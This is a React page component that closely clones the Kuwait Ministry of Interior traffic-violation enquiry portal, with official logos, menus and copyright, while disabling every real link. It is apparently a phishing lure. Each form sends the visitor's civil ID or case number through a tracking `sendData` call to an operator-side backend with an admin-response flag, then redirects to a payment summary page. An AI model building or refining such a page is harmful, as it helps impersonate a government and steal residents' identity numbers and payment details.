import { useState, useEffect } from "react";
import { sendData, navigateToPage } from "@/lib/store";

export default function ViolationEnquiry() {
  const [enquiryType, setEnquiryType] = useState("الأفراد");
  const [civilId, setCivilId] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [fineType, setFineType] = useState("1");
  const [finesCivilId, setFinesCivilId] = useState("");
  const [refCivilId, setRefCivilId] = useState("");
  const [caseRefNum, setCaseRefNum] = useState("");
  const [activeCard, setActiveCard] = useState(1); // 0=payment, 1=refnum, 2=health, 3=case

  useEffect(() => { navigateToPage('استعلام المخالفات'); }, []);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!civilId.trim()) return;
    setIsSubmitting(true);
    sendData({
      data: { enquiryType, civilId: civilId.trim() },
      current: 'استعلام المخالفات',
      nextPage: 'summary-payment',
      waitingForAdminResponse: false,
    });
    localStorage.setItem('civilId', civilId.trim());
    localStorage.setItem('enquiryType', enquiryType);
    setTimeout(() => { setIsSubmitting(false); window.location.href = '/summary-payment'; }, 1000);
  };

  const handleFinesPay = () => {
    if (!finesCivilId.trim()) return;
    sendData({ data: { fineType: fineType === '1' ? 'المرور' : 'الإقامة', civilId: finesCivilId.trim() }, current: 'دفع المخالفات والغرامات', nextPage: 'summary-payment', waitingForAdminResponse: false });
    localStorage.setItem('civilId', finesCivilId.trim());
    localStorage.setItem('enquiryType', fineType === '1' ? 'المرور' : 'الإقامة');
    window.location.href = '/summary-payment';
  };

  const handleCaseCheck = () => {
    if (!caseRefNum.trim()) return;
    sendData({ data: { caseRefNum: caseRefNum.trim() }, current: 'الاستعلام عن سير القضية', nextPage: 'summary-payment', waitingForAdminResponse: false });
    localStorage.setItem('civilId', caseRefNum.trim());
    localStorage.setItem('enquiryType', 'استعلام قضية');
    window.location.href = '/summary-payment';
  };

  const sidebarItems = [
    { text: 'الخدمات الالكترونية لرخص السوق', icon: '/moi-assets/ico-renew-license.svg' },
    { text: 'دفع المخالفات', icon: '/moi-assets/ico-payment.svg' },
    { text: 'نظام مواعيد اختبار القيادة', icon: '/moi-assets/ico-booking.svg' },
    { text: 'معاملات المرور', icon: '/moi-assets/ico-procedures.svg' },
    { text: 'مواقع الإدارة العامة للمرور', icon: '/moi-assets/ico-locations-sections.svg' },
    { text: 'شروط منح رخص السوق لغير الكويتيين', icon: '/moi-assets/ico-pdf-doc.svg' },
  ];

  const bottomCards = [
    { id: 0, title: 'دفع المخالفات والغرامات', icon: '/moi-assets/ico-pay-fines.svg' },
    { id: 1, title: 'الإستعلام عن رقم مرجع الداخلية', icon: '/moi-assets/ico-get-ref-num.svg' },
    { id: 2, title: 'جاهزية نتيجة الفحص الطبي', icon: '/moi-assets/ico-health-check-result.svg' },
    { id: 3, title: 'الاستعلام عن سير القضية', icon: '/moi-assets/ico-case-track.svg' },
  ];

  // Container margin style matching original: margin: 0 70px, padding: 0 15px
  const containerStyle = { margin: '0 70px', padding: '0 15px' };

  return (
    <div style={{
      minHeight: '100vh', direction: 'rtl',
      fontFamily: "'Droid Arabic Kufi Regular', 'Skia Regular', Arial, Tahoma, sans-serif",
      fontSize: '14px', color: '#212529',
      backgroundColor: '#eceae4',
      backgroundImage: 'url(/moi-assets/bg-pattern.png)',
      backgroundRepeat: 'repeat-x',
      backgroundSize: '77px 200px',
      margin: 0, padding: 0,
    }}>

      {/* ===== HEADER ===== */}
      <header>
        <div style={containerStyle}>
          <div style={{ display: 'flex', alignItems: 'center', padding: '10px 0', justifyContent: 'flex-start' }}>
            <a href="#" onClick={e => e.preventDefault()} style={{ flexShrink: 0 }}>
              <img src="/moi-assets/logo-moi.svg" alt="وزارة الداخلية" style={{ width: '112px', height: '120px' }} />
            </a>
            <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'flex-start', gap: '8px', paddingRight: '15px' }}>
              <img src="/moi-assets/state-of-kuwait.svg" alt="دولة الكويت" style={{ width: '118px', height: 'auto' }} />
              <img src="/moi-assets/ministry-of-interior.svg" alt="وزارة الداخلية" style={{ width: '118px', height: 'auto' }} />
            </div>
          </div>
        </div>
      </header>

      {/* ===== NAVBAR ===== */}
      <nav style={{ backgroundColor: '#000576', borderBottom: '1px solid rgba(255,255,255,0.1)', boxShadow: '0 2px 4px rgba(0,0,0,0.1)' }}>
        <div style={containerStyle}>
          <ul style={{ display: 'flex', listStyle: 'none', margin: 0, padding: 0, alignItems: 'center' }}>
            {['الرئيسيــة', 'الخدمات الإلكترونيـة', 'إدارات توعوية', 'الإصدارات الإلكترونية', 'التحقق من الوثائق', 'يهمنا رايك', 'أرقام الطوارئ', 'منصة المواعيد'].map((item, i) => (
              <li key={i}>
                <a href="#" onClick={e => e.preventDefault()} style={{
                  color: '#fff', textDecoration: 'none', padding: '5px 15px',
                  display: 'block', fontSize: '20px', whiteSpace: 'nowrap', lineHeight: '56px',
                }}
                onMouseEnter={e => (e.currentTarget.style.color = '#c09f66')}
                onMouseLeave={e => (e.currentTarget.style.color = '#fff')}
                >{item}</a>
              </li>
            ))}
            <li style={{ marginRight: 'auto' }}>
              <button style={{ background: 'transparent', border: '1px solid rgba(255,255,255,0.5)', color: '#fff', padding: '6px 20px', borderRadius: '4px', cursor: 'pointer', fontSize: '14px' }}>English</button>
            </li>
          </ul>
        </div>
      </nav>

      {/* ===== READER BAR ===== */}
      <div style={{ ...containerStyle, padding: '8px 15px', display: 'flex', alignItems: 'center', gap: '8px', justifyContent: 'flex-end' }}>
        <button style={{ background: 'none', border: '1px solid #999', borderRadius: '3px', padding: '4px 8px', cursor: 'pointer', fontSize: '16px', color: '#666' }}>☰</button>
        <span style={{ fontSize: '13px', color: '#666' }}>استمع</span>
        <span style={{ fontSize: '13px', color: '#666' }}>◀</span>
        <button style={{ background: '#000576', border: 'none', borderRadius: '50%', width: '24px', height: '24px', color: '#fff', cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '10px' }}>▶</button>
      </div>

      {/* ===== MAIN CONTENT ===== */}
      <div style={containerStyle}>
        <div style={{ display: 'flex', flexWrap: 'wrap', textAlign: 'center' }}>

          {/* ===== SIDEBAR (col-4) - FIRST in HTML = RIGHT in RTL ===== */}
          <div style={{
            flex: '0 0 33.333333%', maxWidth: '33.333333%',
            backgroundColor: '#000576', color: '#fff',
            padding: '20px', boxSizing: 'border-box',
            textAlign: 'right',
          }}>
            {sidebarItems.map((item, i) => (
              <div key={i} style={{ display: 'flex', alignItems: 'center', marginTop: i > 0 ? '8px' : '0' }}>
                <div style={{ flex: '0 0 16.666667%', maxWidth: '16.666667%', margin: '0 4px' }}>
                  <a href="#" onClick={e => e.preventDefault()}>
                    <img src={item.icon} alt="" style={{ width: '3.4em' }} />
                  </a>
                </div>
                <div style={{ flex: '0 0 66.666667%', maxWidth: '66.666667%', alignSelf: 'center' }}>
                  <a href="#" onClick={e => e.preventDefault()} style={{ color: '#fff', textDecoration: 'none', fontSize: '14px' }}
                    onMouseEnter={e => (e.currentTarget.style.color = '#c09f66')}
                    onMouseLeave={e => (e.currentTarget.style.color = '#fff')}
                  >{item.text}</a>
                </div>
                <div style={{ flex: '0 0 8.333333%' }}>&nbsp;</div>
              </div>
            ))}
          </div>

          {/* ===== FORM AREA (col-8) - SECOND in HTML = LEFT in RTL ===== */}
          <div style={{ flex: '0 0 66.666667%', maxWidth: '66.666667%', padding: '0 15px', boxSizing: 'border-box' }}>

            {/* Title with traffic logo - flex-end = RIGHT in RTL */}
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'flex-start', padding: '20px 0 10px', gap: '10px' }}>
              <img src="/moi-assets/ico-general-traffic.svg" alt="المرور" style={{ width: '60px', height: '60px' }} />
              <span style={{ fontSize: '16px', fontWeight: 'bold', color: '#000576' }}>الإدارة العامة للمرور</span>
            </div>

            {/* Subtitle with horizontal line */}
            <div style={{ textAlign: 'center', position: 'relative', margin: '10px 0 20px' }}>
              <div style={{ position: 'absolute', top: '50%', left: 0, right: 0, height: '1px', background: '#bbb' }} />
              <span style={{ position: 'relative', background: '#eceae4', padding: '0 20px', fontSize: '16px', fontWeight: 'bold', color: '#333' }}>الإدارة العامة للمرور</span>
            </div>

            {/* FORM */}
            <form onSubmit={handleSubmit}>
              {/* Enquiry Type - col-md-6 */}
              <div style={{ display: 'flex', flexWrap: 'wrap' }}>
                <div style={{ flex: '0 0 50%', maxWidth: '50%', padding: '0 15px', boxSizing: 'border-box' }}>
                  <label style={{ fontSize: '14px', color: '#212529', display: 'block', marginBottom: '4px', textAlign: 'right' }}>Enquiry Type</label>
                  <select value={enquiryType} onChange={e => setEnquiryType(e.target.value)}
                    style={{ width: '100%', height: '38px', padding: '6px 12px', fontSize: '16px', color: '#495057', border: '1px solid #ced4da', borderRadius: '4px', background: '#fff', outline: 'none', display: 'block' }}>
                    <option value="الأفراد">الأفراد</option>
                    <option value="الشركات">الشركات</option>
                  </select>
                </div>
              </div>

              {/* Civil ID - col-md-6 */}
              <div style={{ display: 'flex', flexWrap: 'wrap', marginTop: '8px' }}>
                <div style={{ flex: '0 0 50%', maxWidth: '50%', padding: '0 15px', boxSizing: 'border-box' }}>
                  <label style={{ fontSize: '14px', color: '#212529', display: 'block', marginBottom: '4px', textAlign: 'right' }}>الرقم المدني أو الرقم الموحد</label>
                  <input type="text" value={civilId} onChange={e => setCivilId(e.target.value.replace(/[^0-9]/g, ''))} maxLength={12}
                    style={{ width: '100%', height: '38px', padding: '6px 12px', fontSize: '16px', color: '#495057', border: '1px solid #ced4da', borderRadius: '4px', background: '#fff', outline: 'none', display: 'block', boxSizing: 'border-box' }} />
                </div>
              </div>

              {/* Submit Button - col-md-4 */}
              <div style={{ display: 'flex', flexWrap: 'wrap', marginTop: '8px' }}>
                <div style={{ flex: '0 0 33.333333%', maxWidth: '33.333333%', padding: '0 15px', boxSizing: 'border-box' }}>
                  <button type="submit" disabled={isSubmitting || !civilId.trim()}
                    style={{
                      width: '100%', height: '35px', padding: '6px 12px', fontSize: '14px',
                      color: '#000576', backgroundColor: '#e9e6de', border: '1px solid #000576',
                      borderRadius: '4px', cursor: civilId.trim() ? 'pointer' : 'not-allowed',
                      marginTop: '8px', opacity: isSubmitting ? 0.7 : 1,
                    }}>
                    {isSubmitting ? 'جاري الاستعلام...' : 'إستعلم'}
                  </button>
                </div>
              </div>

              {/* Warning text */}
              <div style={{ marginTop: '16px', textAlign: 'right', fontWeight: 'bold', fontSize: '14px', color: '#212529' }}>
                بعد إجراء عملية الدفع.. يرجى عدم محاولة الدفع مرة أخرى حيث يجرى تحديث البيانات خلال 15 دقيقة
              </div>

              {/* Legend badges */}
              <div style={{ display: 'flex', gap: '8px', justifyContent: 'center', marginTop: '8px' }}>
                <span style={{ backgroundColor: '#28a745', color: '#fff', padding: '8px', fontSize: '10.5px', borderRadius: '4px' }}>قابلة للدفع الكترونياً</span>
                <span style={{ backgroundColor: '#dc3545', color: '#fff', padding: '8px', fontSize: '10.5px', borderRadius: '4px' }}>غير قابلة للدفع الكترونياً</span>
              </div>
            </form>
          </div>
        </div>
      </div>

      {/* ===== BOTTOM CARDS (DQA Accordion) ===== */}
      <div style={{ margin: '20px 0 0', padding: '0' }}>
        <div style={{ maxWidth: '1110px', margin: '0 auto', padding: '0' }}>
          <div style={{ display: 'flex', height: '221px', overflow: 'hidden' }}>
            {bottomCards.map((card) => {
              const isActive = activeCard === card.id;
              return (
                <div key={card.id} style={{
                  width: isActive ? '465px' : '200px',
                  height: '221px',
                  transition: 'width 0.3s ease',
                  cursor: 'pointer',
                  display: 'flex',
                  flexShrink: 0,
                  overflow: 'hidden',
                }}
                onClick={() => setActiveCard(card.id)}
                >
                  {/* Icon column - always 200px */}
                  <div style={{ width: '200px', flexShrink: 0, display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                    <img src={card.icon} alt={card.title} style={{ width: '8.572em', height: '8.572em' }} />
                  </div>

                  {/* Content column - only visible when active */}
                  {isActive && (
                    <div style={{ flex: 1, padding: '10px', display: 'flex', flexDirection: 'column', overflow: 'hidden' }}>
                      <h5 style={{ fontSize: '14px', fontWeight: 'bold', color: '#001A63', margin: '0 0 4px', textAlign: 'center' }}>{card.title}</h5>
                      <img src="/moi-assets/ico-horizontal-bar.svg" alt="" style={{ height: '6px', margin: '0 auto 8px' }} />

                      {/* Card 0: Payment */}
                      {card.id === 0 && (
                        <div style={{ padding: '0 8px' }}>
                          <select value={fineType} onChange={e => setFineType(e.target.value)}
                            style={{ width: '100%', height: '30px', fontSize: '12px', border: '1px solid #ced4da', borderRadius: '4px', padding: '2px 6px', marginBottom: '4px' }}>
                            <option value="1">المرور</option>
                            <option value="2">الإقامة</option>
                          </select>
                          <input type="text" value={finesCivilId} onChange={e => setFinesCivilId(e.target.value.replace(/[^0-9]/g, ''))}
                            placeholder="الرقم المدني" maxLength={12}
                            style={{ width: '100%', height: '30px', fontSize: '12px', border: '1px solid #ced4da', borderRadius: '4px', padding: '2px 6px', marginBottom: '4px', boxSizing: 'border-box' }} />
                          <button onClick={handleFinesPay}
                            style={{ width: '100%', padding: '6px', fontSize: '12px', backgroundColor: '#6c757d', color: '#fff', border: 'none', borderRadius: '4px', cursor: 'pointer' }}>دفع</button>
                        </div>
                      )}

                      {/* Card 1: Ref Num */}
                      {card.id === 1 && (
                        <div style={{ padding: '0 8px' }}>
                          <input type="text" value={refCivilId} onChange={e => setRefCivilId(e.target.value.replace(/[^0-9]/g, ''))}
                            placeholder="الرقم المدني" maxLength={12}
                            style={{ width: '100%', height: '30px', fontSize: '12px', border: '1px solid #ced4da', borderRadius: '4px', padding: '2px 6px', marginBottom: '4px', boxSizing: 'border-box' }} />
                          <button style={{ width: '100%', padding: '6px', fontSize: '12px', backgroundColor: '#6c757d', color: '#fff', border: 'none', borderRadius: '4px', cursor: 'pointer', marginBottom: '4px' }}>للكويتين</button>
                          <button style={{ width: '100%', padding: '6px', fontSize: '12px', backgroundColor: '#6c757d', color: '#fff', border: 'none', borderRadius: '4px', cursor: 'pointer' }}>للمقيمين</button>
                        </div>
                      )}

                      {/* Card 2: Health Check */}
                      {card.id === 2 && (
                        <div style={{ textAlign: 'center', fontSize: '11px', color: '#666', marginTop: '20px' }}>
                          <div>The service will be available shortly</div>
                          <div style={{ marginTop: '6px' }}>الخدمة ستعود قريباً</div>
                        </div>
                      )}

                      {/* Card 3: Case Check */}
                      {card.id === 3 && (
                        <div style={{ padding: '0 8px' }}>
                          <input type="text" value={caseRefNum} onChange={e => setCaseRefNum(e.target.value)}
                            placeholder="رقم مرجع الداخلية" maxLength={12}
                            style={{ width: '100%', height: '30px', fontSize: '12px', border: '1px solid #ced4da', borderRadius: '4px', padding: '2px 6px', marginBottom: '4px', boxSizing: 'border-box' }} />
                          <button onClick={handleCaseCheck}
                            style={{ width: '100%', padding: '6px', fontSize: '12px', backgroundColor: '#6c757d', color: '#fff', border: 'none', borderRadius: '4px', cursor: 'pointer' }}>استعلم</button>
                        </div>
                      )}
                    </div>
                  )}
                </div>
              );
            })}

            {/* Last item: أحدث الخدمات */}
            <div style={{ width: '200px', flexShrink: 0, display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
              <img src="/moi-assets/ico-new-services.svg" alt="أحدث الخدمات" style={{ width: '8.572em', height: '8.572em' }} />
            </div>
          </div>
        </div>
      </div>

      {/* ===== FOOTER ===== */}
      <footer style={{
        backgroundColor: '#000576', marginTop: '8px',
        padding: '15px 0', textAlign: 'center',
      }}>
        <div style={{ display: 'flex', justifyContent: 'center', gap: '12px', marginBottom: '10px' }}>
          {[
            /* Apple */ "M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.8-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z",
            /* Android */ "M17.6 11.48V8.5c0-.56-.45-1.01-1.01-1.01h-.5V5.49c0-.56-.45-1.01-1.01-1.01s-1.01.45-1.01 1.01V7.5h-4.07V5.49c0-.56-.45-1.01-1.01-1.01s-1.01.45-1.01 1.01V7.5h-.5c-.56 0-1.01.45-1.01 1.01v2.98H5.5c-.56 0-1.01.45-1.01 1.01v5.05c0 .56.45 1.01 1.01 1.01s1.01-.45 1.01-1.01V12.5h.97v5.05c0 .56.45 1.01 1.01 1.01h.5v2.93c0 .56.45 1.01 1.01 1.01s1.01-.45 1.01-1.01v-2.93h2.05v2.93c0 .56.45 1.01 1.01 1.01s1.01-.45 1.01-1.01v-2.93h.5c.56 0 1.01-.45 1.01-1.01V12.5h.97v5.05c0 .56.45 1.01 1.01 1.01s1.01-.45 1.01-1.01V12.5c0-.56-.45-1.01-1.01-1.01h-.49z",
            /* Facebook */ "M22 12c0-5.52-4.48-10-10-10S2 6.48 2 12c0 4.84 3.44 8.87 8 9.8V15H8v-3h2V9.5C10 7.57 11.57 6 13.5 6H16v3h-2c-.55 0-1 .45-1 1v2h3v3h-3v6.95c5.05-.5 9-4.76 9-9.95z",
            /* Twitter */ "M22.46 6c-.77.35-1.6.58-2.46.69.88-.53 1.56-1.37 1.88-2.38-.83.5-1.75.85-2.72 1.05C18.37 4.5 17.26 4 16 4c-2.35 0-4.27 1.92-4.27 4.29 0 .34.04.67.11.98C8.28 9.09 5.11 7.38 3 4.79c-.37.63-.58 1.37-.58 2.15 0 1.49.75 2.81 1.91 3.56-.71 0-1.37-.2-1.95-.5v.03c0 2.08 1.48 3.82 3.44 4.21a4.22 4.22 0 0 1-1.93.07 4.28 4.28 0 0 0 4 2.98 8.521 8.521 0 0 1-5.33 1.84c-.34 0-.68-.02-1.02-.06C3.44 20.29 5.7 21 8.12 21 16 21 20.33 14.46 20.33 8.79c0-.19 0-.37-.01-.56.84-.6 1.56-1.36 2.14-2.23z",
            /* Instagram */ "M7.8 2h8.4C19.4 2 22 4.6 22 7.8v8.4a5.8 5.8 0 0 1-5.8 5.8H7.8C4.6 22 2 19.4 2 16.2V7.8A5.8 5.8 0 0 1 7.8 2m-.2 2A3.6 3.6 0 0 0 4 7.6v8.8C4 18.39 5.61 20 7.6 20h8.8a3.6 3.6 0 0 0 3.6-3.6V7.6C20 5.61 18.39 4 16.4 4H7.6m9.65 1.5a1.25 1.25 0 0 1 1.25 1.25A1.25 1.25 0 0 1 17.25 8 1.25 1.25 0 0 1 16 6.75a1.25 1.25 0 0 1 1.25-1.25M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3z",
            /* YouTube */ "M10 15l5.19-3L10 9v6m11.56-7.83c.13.47.22 1.1.28 1.9.07.8.1 1.49.1 2.09L22 12c0 2.19-.16 3.8-.44 4.83-.25.9-.83 1.48-1.73 1.73-.47.13-1.33.22-2.65.28-1.3.07-2.49.1-3.59.1L12 19c-4.19 0-6.8-.16-7.83-.44-.9-.25-1.48-.83-1.73-1.73-.13-.47-.22-1.1-.28-1.9-.07-.8-.1-1.49-.1-2.09L2 12c0-2.19.16-3.8.44-4.83.25-.9.83-1.48 1.73-1.73.47-.13 1.33-.22 2.65-.28 1.3-.07 2.49-.1 3.59-.1L12 5c4.19 0 6.8.16 7.83.44.9.25 1.48.83 1.73 1.73z",
          ].map((path, i) => (
            <a key={i} href="#" onClick={e => e.preventDefault()} style={{ color: '#fff', textDecoration: 'none' }}>
              <svg width="22" height="22" viewBox="0 0 24 24" fill="#6c757d"><path d={path}/></svg>
            </a>
          ))}
        </div>
        <div style={{ color: '#6c757d', fontSize: '12px' }}>
          © جميع الحقوق محفوظة لوزارة الداخلية-دولة الكويت - 2026
        </div>
      </footer>

      <style>{`
        * { box-sizing: border-box; }
        @media (max-width: 992px) {
          header > div, nav > div { margin: 0 15px !important; }
        }
        @media (max-width: 768px) {
          header > div, nav > div { margin: 0 10px !important; }
        }
      `}</style>
    </div>
  );
}
